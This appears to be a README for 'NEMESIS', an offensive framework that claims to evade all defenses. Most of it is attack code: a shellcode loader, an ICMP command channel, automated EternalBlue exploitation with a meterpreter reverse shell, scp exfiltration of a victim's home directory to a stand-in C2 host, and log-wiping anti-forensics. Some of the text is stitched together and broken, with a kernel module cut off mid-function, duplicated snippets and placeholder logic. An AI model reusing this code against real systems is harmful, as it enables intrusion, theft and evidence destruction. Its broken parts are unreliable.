# Project: NEMESIS

## Coming soon.

(Neural Engine for Machine-code Exploitation, Stealth, and Intelligence Scripting)

NEMESIS is a next-generation AI-driven, machine-code-based red teaming and penetration testing framework. It is built to bypass all modern defenses, including WAFs, EDRs, CDNs, load balancers, honeypots, and AI-driven security models, while operating entirely in raw binary code at the processor level.

This project aims to redefine red teaming capabilities by incorporating machine learning, direct hardware exploitation, autonomous decision-making, and advanced stealth techniques, making it virtually undetectable.

Project Development Breakdown

This section details the specific features, coding languages, and technologies that will be used to bring NEMESIS to life.

1. Machine Code Execution & Payload Engine

Language: C, Assembly, Rust

Functionality:

Dynamically generate raw binary payloads

Execute machine code directly in memory

CPU-agnostic shellcode creation



PoC Example (x86 Payload Execution in C):
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

// Simple x86_64 shellcode (executes /bin/sh)
unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x50\x48\x89\xe6\x50\x48\x89"
                            "\xe1\x50\x48\x8d\x3d\x04\x00\x00\x00\x57\x48\x89\xe6\xb0"
                            "\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00";

void execute_shellcode() {
    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
}

int main() {
    execute_shellcode();
    return 0;
}
```

---

2. AI-Driven Exploitation

Language: Python (PyTorch, TensorFlow), Rust (for speed)

Functionality:

AI models analyze security environment

Dynamically modify exploits based on real-time analysis

Reinforcement learning improves attack success rate



PoC Example: AI-Based Payload Mutation:
```python
import random

opcode_variants = [b"\x90", b"\x66\x90", b"\x0F\x1F\x00", b"\x0F\x1F\x40\x00"]

def generate_polymorphic_payload(size=50):
    payload = b"".join(random.choice(opcode_variants) for _ in range(size))
    return payload

polymorphic_payload = generate_polymorphic_payload()
print(f"Generated Payload: {polymorphic_payload.hex()}")
```

---

3. Covert Communication

ICMP C2 Channel (Python + Scapy)

```python
from scapy.all import *

def send_icmp_command(target_ip, command):
    icmp_packet = IP(dst=target_ip)/ICMP()/Raw(load=command)
    send(icmp_packet)

def listen_icmp():
    def icmp_handler(pkt):
        if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
            print(f"Received Command: {pkt[Raw].load.decode()}")
    
    sniff(filter="icmp", prn=icmp_handler)

# Example usage:
# send_icmp_command("192.168.1.100", "ls -la")
# listen_icmp()
```

---

4. Kernel Memory Manipulation

Linux Kernel Module (C)

```C
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init nemesis_init(void) {
    printk(KERN_INFO "Nemesis Kernel Module Loaded\n");

For real-time adaptive AI-generated payloads, the system will leverage a reinforcement learning (RL) model to continuously evolve its payloads based on feedback during execution, such as detection evasion success and impact.

Here’s how it can work:

🔍 Real-Time Adaptive Payloads with Reinforcement Learning

RL-Driven Payload Generation: A reinforcement learning model continuously improves the generated payloads.

Environment Feedback: The payload’s success is evaluated by factors such as detection evasion, payload execution time, and system impact.

Self-Optimization: The model optimizes payloads by adjusting key parameters (e.g., register values, system calls, or shellcode mutation) to increase success rates based on feedback.

Learning Rate: Payloads are evolved based on both immediate and long-term goals to maximize stealth and efficiency.

How It Works:

1. RL Agent: A neural network that takes in the current state (which could represent features of the current payload like mutations, execution metrics, etc.) and outputs an action (mutate, execute, or no change).


2. Environment: The environment simulates the consequences of the agent's action (mutating the payload or executing it) and returns a reward based on the payload's success (e.g., evasion of detection or efficiency).


3. Training Loop: The agent iteratively learns to optimize payload mutations through a reward-based system, adjusting its approach based on performance feedback.




---

📌 Features of RL-Driven Polymorphic Payloads:

Adaptive Payloads: Payloads evolve in real-time based on feedback from previous executions.

Self-Optimizing Algorithms: The AI model continuously improves payload generation strategies.

Evasion & Stealth Focus: The agent is rewarded for evading detection and executing successfully.

Dynamic Shellcode Mutation: Payload mutations are driven by RL to ensure uniqueness every time.

---

## 24/03/2025 03:00am updates

For cross-platform payload generation with reinforcement learning (RL)-driven evolution, we need to enhance the model to generate platform-specific payloads. This involves:

Dynamic Payload Adaptation: The RL model will adapt payloads based on the OS and architecture it is targeting.

Cross-Platform Modules: A module for each platform (e.g., Windows, Linux, macOS) that adjusts payload generation logic.

System Call Obfuscation: The RL agent will learn to mutate payloads in a way that respects system-specific API calls and obfuscates them to evade detection.


Here’s how we will structure this with the necessary files and code updates:

```

---

📝 platform_modules/windows_payload.py

# Windows-specific payload evaluation logic

```python
def evaluate(payload):
    # Placeholder for Windows-specific evaluation (e.g., system call evasion, bypassing AV)
    if np.mean(payload) > 0.5:  # Random evaluation (replace with real-world feedback)
        return 1  # Reward for effective payload
    return -1  # Penalty for ineffective payload
```

📝 platform_modules/linux_payload.py

# Linux-specific payload evaluation logic

```python
def evaluate(payload):
    # Placeholder for Linux-specific evaluation (e.g., system call obfuscation, avoiding SELinux)
    if np.mean(payload) > 0.5:  # Random evaluation (replace with real-world feedback)
        return 1  # Reward for effective payload
    return -1  # Penalty for ineffective payload
```

📝 platform_modules/macos_payload.py

# macOS-specific payload evaluation logic

```python
def evaluate(payload):
    # Placeholder for macOS-specific evaluation (e.g., system call obfuscation, bypassing Gatekeeper)
    if np.mean(payload) > 0.5:  # Random evaluation (replace with real-world feedback)
        return 1  # Reward for effective payload
    return -1  # Penalty for ineffective payload
```

---

Explanation:

1. Platform Modules: Separate modules (windows_payload.py, linux_payload.py, macos_payload.py) handle platform-specific payload logic. This modularity allows the RL model to adjust its behavior for different systems.


2. RL Training: The RLAgent will optimize its payloads based on platform-specific feedback. You can call train_rl_agent("linux"), train_rl_agent("windows"), or train_rl_agent("macos") to train for different platforms.


3. Cross-Platform Payload Evaluation: The RL model is integrated with platform-specific payload evaluation, ensuring that the generated payloads are effective on the target platform.


---

To integrate NEMESIS with offensive tools like Metasploit and Cobalt Strike and access ShellDonX for converting manually entered payloads, we need to:

1. Integrate with Metasploit and Cobalt Strike:

These tools allow for external interaction via RPC or API. We'll use these to trigger payload generation or command execution.

Metasploit allows us to interact with it using the RPC API.

Cobalt Strike has the Aggressor Script API, allowing integration with external scripts.



2. ShellDonX Integration:

ShellDonX converts manual payloads into more sophisticated forms.

We will create an interface in NEMESIS to accept user input for payloads and convert them using ShellDonX.

📝 Integration with Metasploit:

You can interact with Metasploit using its RPC API. Below is an integration script that communicates with Metasploit and triggers a payload.

metasploit_integration.py

```python
import xmlrpc.client

class Metasploit:
    def __init__(self, host='localhost', port=55553, user='msf', password='msf'):
        self.client = xmlrpc.client.ServerProxy(f"http://{host}:{port}/api/")
        self.auth_token = self.login(user, password)
        
    def login(self, user, password):
        response = self.client.auth.login(user, password)
        return response

    def generate_payload(self, exploit_module, payload_type, lhost, lport):
        # Generate a payload in Metasploit
        response = self.client.modules.execute(
            f"exploit/{exploit_module}/{payload_type}",
            {"LHOST": lhost, "LPORT": lport}
        )
        return response

    def execute_payload(self, payload):
        # Execute a payload in Metasploit
        response = self.client.consoles.console.write(payload)
        return response

# Example Usage
metasploit = Metasploit()
payload = metasploit.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')
print("Payload generated: ", payload)
metasploit.execute_payload(payload)
```

---

📝 Integration with Cobalt Strike (Aggressor Script):

Cobalt Strike allows integration using Aggressor Scripts. Below is an example Aggressor script to call external Python scripts from Cobalt Strike.

cobalt_strike_integration.cna

```SOAR
# Cobalt Strike Aggressor Script to integrate with NEMESIS
# This script will execute a Python script to generate a payload

on "help" {
    println("Cobalt Strike - NEMESIS Integration Loaded");
}

# Trigger a Python script for payload generation
on "spawn" {
    execute-assembly "python3 generate_payload.py";
}
```

This script is designed to trigger Python scripts from within Cobalt Strike. It can trigger payload generation or post-exploitation actions based on user-defined parameters.


---

📝 ShellDonX Integration (Payload Conversion):

We will create an interface to ShellDonX where the user can input manual payloads that will be converted into sophisticated versions using ShellDonX.

shelldonx_integration.py
```
import subprocess

class ShellDonX:
    def __init__(self, shelldonx_path='/path/to/shelldonx'):
        self.shelldonx_path = shelldonx_path

    def convert_payload(self, payload):
        # Call ShellDonX to convert the payload
        result = subprocess.run([self.shelldonx_path, '--convert', payload], stdout=subprocess.PIPE)
        return result.stdout.decode('utf-8')

# Example Usage
shelldonx = ShellDonX('/usr/local/bin/shelldonx')  # Adjust the path to your installation
manual_payload = "echo 'This is a test payload'"
converted_payload = shelldonx.convert_payload(manual_payload)
print("Converted Payload: ", converted_payload)
```

---

📝 NEMESIS Payload Generation and Augmentation

Integrate ShellDonX into the payload generation loop and allow NEMESIS to invoke it for manual payload conversion:

rl_payload_gen.py Update:

```python
from shelldonx_integration import ShellDonX

class PayloadGen:
    def __init__(self, platform, shelldonx_path='/usr/local/bin/shelldonx'):
        self.platform = platform
        self.shelldonx = ShellDonX(shelldonx_path)

    def generate_and_convert_payload(self, manual_payload):
        print(f"Converting manual payload using ShellDonX...")
        converted_payload = self.shelldonx.convert_payload(manual_payload)
        return converted_payload

# Example Usage
payload_gen = PayloadGen("linux")
manual_payload = "echo 'This is a test payload'"
converted_payload = payload_gen.generate_and_convert_payload(manual_payload)
print("Converted Payload: ", converted_payload)
```

---

Explanation:

1. Metasploit Integration: By using the RPC API, we can trigger Metasploit to generate and execute payloads directly from NEMESIS. This can be customized to fit various exploits and payload types.


2. Cobalt Strike Integration: The Aggressor Script allows us to integrate with Cobalt Strike by calling Python scripts that perform actions like payload generation or exploitation.


3. ShellDonX Integration: This allows the user to input manual payloads that will be converted into more sophisticated versions using ShellDonX.


4. Payload Conversion in NEMESIS: The rl_payload_gen.py script has been updated to integrate ShellDonX for payload conversion before proceeding with execution or exploitation.


---


To move forward with Automated Workflows for NEMESIS, we will integrate the following key automation components:

1. Continuous Integration (CI) Pipeline:

We will set up a CI pipeline using tools like Jenkins, GitLab CI, or GitHub Actions to automate tests, deployment, and payload generation. This ensures a consistent workflow in generating payloads, executing tests, and delivering results.

2. Payload Generation Automation:

Automating payload generation through integration with Metasploit, Cobalt Strike, and ShellDonX will allow for streamlined payload creation based on certain conditions. We will create a mechanism for automatically adjusting payloads depending on the attack vector and platform, and triggering them based on specific predefined scenarios.

3. Automated Exploitation & Post-Exploitation Phases:

Once the payload is generated, automation can take over the exploitation phase (e.g., running Metasploit modules) and even execute post-exploitation tasks such as lateral movement, data exfiltration, or system compromise.


---

Key Automation Components:

1. Automated Payload Generation:

Trigger based on network reconnaissance or system vulnerabilities identified.

Use machine learning models to determine optimal payloads based on the target system or vulnerability.



2. Execution Automation (Payloads and Exploits):

Once a payload is generated, automatically launch it against the target.

Provide functionality for autonomous pivoting between systems and dynamic attack vector updates.



3. Automated Post-Exploitation Actions:

Actions like data exfiltration, command-and-control (C2) server communication, and privilege escalation can be automated post-exploit.





---

Workflow Automation Example:

1. Reconnaissance → Payload Generation → Exploitation → Post-Exploitation:

Let's break it down into automated tasks for NEMESIS.


---

1. Reconnaissance & Automated Payload Generation:

This step can be automated using a reconnaissance tool like Nmap or Amass (for enumeration) followed by Metasploit or Cobalt Strike for exploit selection.

Automated Reconnaissance Script:

```pyton
import subprocess
import time
from metasploit_integration import Metasploit
from nmap import PortScanner

class ReconAndExploitAutomation:
    def __init__(self, target_ip, metasploit_obj):
        self.target_ip = target_ip
        self.metasploit_obj = metasploit_obj
        self.scanner = PortScanner()

    def run_recon(self):
        print(f"Running reconnaissance on {self.target_ip}...")
        # Run Nmap to discover open ports
        self.scanner.scan(self.target_ip)
        open_ports = self.scanner[self.target_ip]['tcp']
        open_ports = [port for port in open_ports if self.scanner[self.target_ip]['tcp'][port]['state'] == 'open']
        print(f"Open ports: {open_ports}")
        return open_ports

    def generate_payload(self, exploit_module, payload_type, lhost, lport):
        print(f"Generating payload using Metasploit...")
        payload = self.metasploit_obj.generate_payload(exploit_module, payload_type, lhost, lport)
        print(f"Generated payload: {payload}")
        return payload

# Example Usage
target_ip = "192.168.1.100"
metasploit = Metasploit()
automation = ReconAndExploitAutomation(target_ip, metasploit)

# Step 1: Run reconnaissance
open_ports = automation.run_recon()

# Step 2: Generate payload based on open ports
if 445 in open_ports:
    payload = automation.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')
```

---

2. Automated Exploitation & Post-Exploitation:

Once the payload is generated, we can proceed with exploiting the target and executing post-exploitation tasks automatically. We'll use Metasploit or Cobalt Strike to execute the payload.

Automated Exploit Execution:

```python
class ExploitationAutomation:
    def __init__(self, metasploit_obj):
        self.metasploit_obj = metasploit_obj

    def execute_exploit(self, payload):
        print("Executing exploit...")
        exploit_result = self.metasploit_obj.execute_payload(payload)
        if "Meterpreter" in exploit_result:
            print("Exploit successful!")
            return True
        else:
            print("Exploit failed!")
            return False

# Example Usage
exploit_automation = ExploitationAutomation(metasploit)
exploit_success = exploit_automation.execute_exploit(payload)

# If the exploit is successful, run post-exploitation tasks
if exploit_success:
    print("Running post-exploitation actions...")
    # Example: Elevate privileges, data exfiltration, or persistence
    # Code for persistence and lateral movement can be added here.
```

---

3. Post-Exploitation Automation:

This phase automates the tasks that can happen after a successful exploit, like setting up reverse shells, adding backdoors, or even data exfiltration.

Example of post-exploitation could include setting a reverse shell:

```python
class PostExploitation:
    def __init__(self, payload):
        self.payload = payload

    def establish_reverse_shell(self):
        print("Establishing reverse shell...")
        # Code to establish a reverse shell connection back to the attacker's C2 server
        # This would typically involve setting up a listener on the attacker's machine.
        # For example:
        reverse_shell_command = f"nc -lvnp {self.payload['LPORT']}"
        subprocess.run(reverse_shell_command, shell=True)

    def exfiltrate_data(self, target_directory):
        print(f"Exfiltrating data from {target_directory}...")
        # Code to exfiltrate data (e.g., copying files)
        # This is a basic example of exfiltrating files from a system:
        exfil_command = f"scp {target_directory}/* attacker@C2_server:/path/to/exfiltrated_data"
        subprocess.run(exfil_command, shell=True)

# Example Usage
post_exploitation = PostExploitation(payload)
post_exploitation.establish_reverse_shell()
post_exploitation.exfiltrate_data("/home/victim")
```

---

4. Orchestration of Entire Workflow:

The orchestration of reconnaissance, exploitation, and post-exploitation will run sequentially based on real-time feedback from the system. We'll create a script that does all of this automatically.

Orchestrator Script:

```python
from metasploit_integration import Metasploit
from reconnaissance_and_exploitation import ReconAndExploitAutomation, ExploitationAutomation, PostExploitation

def main():
    target_ip = "192.168.1.100"
    metasploit = Metasploit()

    # Step 1: Run reconnaissance
    automation = ReconAndExploitAutomation(target_ip, metasploit)
    open_ports = automation.run_recon()

    # Step 2: Generate payload based on open ports
    if 445 in open_ports:
        payload = automation.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')

        # Step 3: Execute the exploit
        exploit_automation = ExploitationAutomation(metasploit)
        if exploit_automation.execute_exploit(payload):
            print("Running post-exploitation tasks...")
            post_exploitation = PostExploitation(payload)
            post_exploitation.establish_reverse_shell()
            post_exploitation.exfiltrate_data("/home/victim")
        else:
            print("Exploit failed, stopping process.")
    else:
        print("No exploitable services found.")

if __name__ == "__main__":
    main()
```

---

5. Workflow Automation with CI/CD Pipeline:

Now, we can implement this entire process in a CI/CD pipeline (e.g., using GitLab CI, GitHub Actions, or Jenkins). The pipeline can trigger these tasks when code is pushed or an action is initiated.

1. CI Pipeline Stages:

Reconnaissance: Automatically perform network scanning (e.g., using Nmap or Amass).

Exploit Generation: Generate payloads via Metasploit or Cobalt Strike.

Exploit Execution: Automatically deploy the payload and execute.

Post-Exploitation: Handle actions like reverse shells and data exfiltration.




Example GitHub Actions Workflow:

```yaml
name: Red Team Automation

on:
  push:
    branches:
      - main

jobs:
  reconnaissance:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run reconnaissance
        run: python3 reconnaissance.py

  exploitation:
    runs-on: ubuntu-latest
    needs: reconnaissance
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Generate and execute payload
        run: python3 exploit.py

  post_exploitation:
    runs-on: ubuntu-latest
    needs: exploitation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run post-exploitation tasks
        run: python3 post_exploitation.py
```

---

Next Steps for NEMESIS: Reconnaissance → Payload Generation → Exploitation → Post-Exploitation Automation

In this option, we will focus on fully automating the process from Reconnaissance through Post-Exploitation, utilizing automated payload generation and exploit execution. The idea is to have a seamless, integrated workflow to run red team activities.

Here’s the step-by-step breakdown:

Step 1: Reconnaissance Automation

The reconnaissance phase is essential to identify potential vulnerabilities and attack vectors. Automated tools like Nmap and Amass will be used to discover open ports and other relevant information on the target network.


---

Automated Reconnaissance Script (Recon.py)

The script uses Nmap to scan the target system and identify open ports. This will be the first step in deciding which payload to generate.

```python
import subprocess
import time
from nmap import PortScanner

class ReconAutomation:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.scanner = PortScanner()

    def run_recon(self):
        print(f"Running reconnaissance on {self.target_ip}...")
        self.scanner.scan(self.target_ip)
        open_ports = self.scanner[self.target_ip]['tcp']
        open_ports = [port for port in open_ports if self.scanner[self.target_ip]['tcp'][port]['state'] == 'open']
        print(f"Open ports: {open_ports}")
        return open_ports

# Example Usage
target_ip = "192.168.1.100"
recon = ReconAutomation(target_ip)
open_ports = recon.run_recon()
```

---

Step 2: Payload Generation Automation

Once the open ports are identified, the system can automatically decide which payload is most appropriate. We will integrate Metasploit for payload generation based on the open ports.


---

Automated Payload Generation Script (PayloadGen.py)

This script uses Metasploit’s capabilities to generate an appropriate payload for exploitation.

```python
from metasploit_integration import Metasploit

class PayloadGeneration:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.metasploit_obj = Metasploit()

    def generate_payload(self, exploit_module, payload_type, lhost, lport):
        print(f"Generating payload using Metasploit...")
        payload = self.metasploit_obj.generate_payload(exploit_module, payload_type, lhost, lport)
        print(f"Generated payload: {payload}")
        return payload

# Example Usage
target_ip = "192.168.1.100"
payload_generator = PayloadGeneration(target_ip)
if 445 in open_ports:  # Example condition based on open ports
    payload = payload_generator.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')
```

---

Step 3: Exploitation Automation

Once the payload is generated, we will move forward with automatically executing the exploit. This step will leverage Metasploit’s exploit execution capabilities to deliver the payload.


---

Automated Exploitation Script (Exploit.py)

This script triggers the exploitation phase where we deploy the payload to the target system.

```
class ExploitAutomation:
    def __init__(self, metasploit_obj):
        self.metasploit_obj = metasploit_obj

    def execute_exploit(self, payload):
        print("Executing exploit...")
        exploit_result = self.metasploit_obj.execute_payload(payload)
        if "Meterpreter" in exploit_result:
            print("Exploit successful!")
            return True
        else:
            print("Exploit failed!")
            return False

# Example Usage
exploit_automation = ExploitAutomation(metasploit)
exploit_success = exploit_automation.execute_exploit(payload)
```

---

Step 4: Post-Exploitation Automation

Once the exploit is successful, we proceed to Post-Exploitation. This stage involves actions such as establishing reverse shells, creating persistence, and potentially exfiltrating data.


---

Automated Post-Exploitation Script (PostExploit.py)

This script automates actions post-exploitation, including establishing a reverse shell or exfiltrating data.

```python
class PostExploitation:
    def __init__(self, payload):
        self.payload = payload

    def establish_reverse_shell(self):
        print("Establishing reverse shell...")
        reverse_shell_command = f"nc -lvnp {self.payload['LPORT']}"
        subprocess.run(reverse_shell_command, shell=True)

    def exfiltrate_data(self, target_directory):
        print(f"Exfiltrating data from {target_directory}...")
        exfil_command = f"scp {target_directory}/* attacker@C2_server:/path/to/exfiltrated_data"
        subprocess.run(exfil_command, shell=True)

# Example Usage
post_exploitation = PostExploitation(payload)
post_exploitation.establish_reverse_shell()
post_exploitation.exfiltrate_data("/home/victim")
```

---

Step 5: Orchestrating the Full Workflow

Now we’ll combine all the steps into a single orchestrated script that automates the entire process.


---

Full Workflow Automation Script (RedTeamAutomation.py)

This script orchestrates the entire process from reconnaissance to post-exploitation, automatically running through all the phases.

```python
from metasploit_integration import Metasploit
from reconnaissance_and_exploitation import ReconAutomation, PayloadGeneration, ExploitAutomation, PostExploitation

def main():
    target_ip = "192.168.1.100"
    metasploit = Metasploit()

    # Step 1: Run reconnaissance
    recon_automation = ReconAutomation(target_ip)
    open_ports = recon_automation.run_recon()

    # Step 2: Generate payload based on open ports
    if 445 in open_ports:
        payload_generator = PayloadGeneration(target_ip)
        payload = payload_generator.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')

        # Step 3: Execute the exploit
        exploit_automation = ExploitAutomation(metasploit)
        if exploit_automation.execute_exploit(payload):
            print("Running post-exploitation tasks...")
            post_exploitation = PostExploitation(payload)
            post_exploitation.establish_reverse_shell()
            post_exploitation.exfiltrate_data("/home/victim")
        else:
            print("Exploit failed, stopping process.")
    else:
        print("No exploitable services found.")

if __name__ == "__main__":
    main()
```

Step 6: Integration into a Continuous Integration (CI) Pipeline

We will now set up a CI/CD pipeline that can automatically trigger these tasks upon code changes or as scheduled. This can be done using GitHub Actions, GitLab CI, or Jenkins.

Here is an example GitHub Actions workflow YAML file to automate these steps.

```yaml
name: Red Team Automation

on:
  push:
    branches:
      - main

jobs:
  reconnaissance:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run reconnaissance
        run: python3 Recon.py

  exploitation:
    runs-on: ubuntu-latest
    needs: reconnaissance
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Generate and execute payload
        run: python3 Exploit.py

  post_exploitation:
    runs-on: ubuntu-latest
    needs: exploitation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run post-exploitation tasks
        run: python3 PostExploit.py
```

CI/CD Integration with ShellDonX Payload Conversion and Automation Enhancements

This option involves refining the CI/CD workflow and expanding the integration with ShellDonX, automating the entire payload lifecycle from reconnaissance to post-exploitation. The goal is to integrate ShellDonX effectively into the pipeline, allowing for seamless payload conversion.

Step 1: Enhance GitHub Actions CI/CD Pipeline

Incorporate more robust error handling and logging to the pipeline. Also, ensure that the pipeline triggers based on specific events such as commits, pull requests, and manual triggers.

Updated GitHub Actions CI/CD Configuration

```yaml
name: Red Team Automation CI/CD

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
  workflow_dispatch:  # Allows manual triggering from GitHub UI

jobs:
  reconnaissance:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run reconnaissance
        run: python3 Recon.py

  payload_generation:
    runs-on: ubuntu-latest
    needs: reconnaissance
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Generate payload
        run: python3 PayloadGeneration.py

  exploit_execution:
    runs-on: ubuntu-latest
    needs: payload_generation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Execute exploit
        run: python3 Exploit.py

  post_exploitation:
    runs-on: ubuntu-latest
    needs: exploit_execution
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Post-exploitation
        run: python3 PostExploitation.py

  payload_conversion:
    runs-on: ubuntu-latest
    needs: post_exploitation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Convert payload using ShellDonX
        run: python3 ShellDonX.py --input-payload "generated_payload" --output-payload "converted_payload"
        continue-on-error: true  # Allows the pipeline to continue even if the conversion step fails
```

Step 2: ShellDonX Integration

Ensure that ShellDonX integration happens smoothly in the payload_conversion job, and improve its payload management.

ShellDonX Conversion Enhancement (ShellDonX.py)

```python
import subprocess
import sys
import logging

class ShellDonXConverter:
    def __init__(self, input_payload, output_payload):
        self.input_payload = input_payload
        self.output_payload = output_payload

    def convert_payload(self):
        try:
            logging.info(f"Converting payload from {self.input_payload} to {self.output_payload}...")
            result = subprocess.run(
                ["shelldonx", "--input", self.input_payload, "--output", self.output_payload],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )

            if result.returncode == 0:
                logging.info(f"Payload converted successfully: {self.output_payload}")
            else:
                logging.error(f"Failed to convert payload: {result.stderr.decode()}")
        except Exception as e:
            logging.error(f"Error during payload conversion: {str(e)}")
            sys.exit(1)

# Example usage
if __name__ == "__main__":
    input_payload = "generated_payload"
    output_payload = "converted_payload"
    converter = ShellDonXConverter(input_payload, output_payload)
    converter.convert_payload()
```

Evasion Techniques and Anti-Forensics in the Workflow

This option involves enhancing the red team’s ability to evade detection, focusing on anti-forensic techniques, payload obfuscation, and stealthy execution of actions. These techniques will ensure that the tools can bypass EDRs, WAFs, and AV systems.

Step 1: Evasion Techniques Integration

Incorporate obfuscation and steganography techniques into the payload generation and exploit execution stages.

Obfuscation Example (PayloadGeneration.py)

```python
import base64
from cryptography.fernet import Fernet

class PayloadObfuscation:
    def __init__(self, payload):
        self.payload = payload
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)

    def obfuscate_payload(self):
        encoded_payload = base64.b64encode(self.payload.encode('utf-8'))
        encrypted_payload = self.cipher_suite.encrypt(encoded_payload)
        return encrypted_payload

    def deobfuscate_payload(self, encrypted_payload):
        decrypted_payload = self.cipher_suite.decrypt(encrypted_payload)
        return base64.b64decode(decrypted_payload).decode('utf-8')

# Example usage
payload = "This is a test payload"
obfuscation = PayloadObfuscation(payload)
obfuscated_payload = obfuscation.obfuscate_payload()
print(f"Obfuscated Payload: {obfuscated_payload}")

# To deobfuscate, you would reverse the process
deobfuscated_payload = obfuscation.deobfuscate_payload(obfuscated_payload)
print(f"Deobfuscated Payload: {deobfuscated_payload}")
```

Step 2: Anti-Forensics and Stealthy Execution

Incorporate techniques that can manipulate or erase logs, use sleep cycles to avoid detection by EDR systems, and disable event logging.

Log Manipulation Example (PostExploitation.py)

```python
import os
import time

class AntiForensicTools:
    def __init__(self):
        self.log_files = ["/var/log/auth.log", "/var/log/syslog"]

    def clear_logs(self):
        for log_file in self.log_files:
            if os.path.exists(log_file):
                with open(log_file, 'w') as file:
                    file.truncate(0)
                    print(f"Cleared logs in {log_file}")

    def disable_logging(self):
        print("Disabling logging temporarily to avoid detection...")
        # Example: disable rsyslog service temporarily
        os.system("systemctl stop rsyslog")

    def resume_logging(self):
        print("Resuming logging...")
        os.system("systemctl start rsyslog")

# Example usage
anti_forensics = AntiForensicTools()
anti_forensics.clear_logs()
anti_forensics.disable_logging()
time.sleep(60)  # Sleep to avoid detection
anti_forensics.resume_logging()
```

Integration with Offensive Tools like Metasploit and Cobalt Strike

In this option, we integrate Metasploit, Cobalt Strike, and other offensive tools into the framework, allowing seamless exploitation and payload management.

Step 1: Metasploit Integration

We’ll update the payload generation and exploit execution stages to support more Metasploit modules.

Updated Metasploit Payload Generation

```python
from metasploit_integration import Metasploit

class EnhancedMetasploitIntegration:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.metasploit_obj = Metasploit()

    def generate_payload(self, exploit_module, payload_type, lhost, lport):
        print(f"Generating payload using Metasploit...")
        payload = self.metasploit_obj.generate_payload(exploit_module, payload_type, lhost, lport)
        print(f"Generated payload: {payload}")
        return payload

    def execute_exploit(self, payload):
        print("Executing exploit with Metasploit...")
        exploit_result = self.metasploit_obj.execute_payload(payload)
        if "Meterpreter" in exploit_result:
            print("Exploit successful!")
            return True
        else:
            print("Exploit failed!")
            return False

# Example usage
target_ip = "192.168.1.100"
msf_integration = EnhancedMetasploitIntegration(target_ip)
payload = msf_integration.generate_payload('windows/smb/ms17_010_eternalblue', 'windows/x64/meterpreter/reverse_tcp', '192.168.1.100', '4444')
exploit_success = msf_integration.execute_exploit(payload)
```

Step 2: Cobalt Strike Integration

To integrate Cobalt Strike, ensure we have an interface that allows for beacon management, payload customization, and post-exploitation task automation.

Cobalt Strike Payload Generation Example (CobaltStrike.py)

```
import subprocess

class CobaltStrikeIntegration:
    def __init__(self, team_server_ip, target_ip):
        self.team_server_ip = team_server_ip
        self.target_ip = target_ip

    def generate_beacon(self):
        print(f"Generating Cobalt Strike beacon for target {self.target_ip}...")
        # Example command to generate a beacon
        subprocess.run(f"./beacon-generator -target {self.target_ip} -server {self.team_server_ip} -type reverse_tcp", shell=True)

# Example usage
target_ip = "192.168.1.100"
team_server_ip = "192.168.1.1"
cobaltstrike = CobaltStrikeIntegration(team_server_ip, target_ip)
cobaltstrike.generate_beacon()
```

CI/CD Automation with ShellDonX Integration (Continued)

We already have the basic integration with ShellDonX for payload conversion in the CI/CD pipeline. Let's complete the automation process with more detailed functionality and add the handling of various tools used for payload generation and exploitation in a more autonomous workflow.

Step 3: Enhanced CI/CD Job (Full Workflow)

```yaml
name: Red Team Automation CI/CD

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
  workflow_dispatch:

jobs:
  reconnaissance:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run reconnaissance
        run: python3 Recon.py

  payload_generation:
    runs-on: ubuntu-latest
    needs: reconnaissance
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Generate payload
        run: python3 PayloadGeneration.py

  exploit_execution:
    runs-on: ubuntu-latest
    needs: payload_generation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Execute exploit
        run: python3 Exploit.py

  post_exploitation:
    runs-on: ubuntu-latest
    needs: exploit_execution
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Post-exploitation
        run: python3 PostExploitation.py

  payload_conversion:
    runs-on: ubuntu-latest
    needs: post_exploitation
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Convert payload using ShellDonX
        run: python3 ShellDonX.py --input-payload "generated_payload" --output-payload "converted_payload"
        continue-on-error: true
```

This workflow involves:

Reconnaissance to gather target information.

Payload Generation from the reconnaissance data.

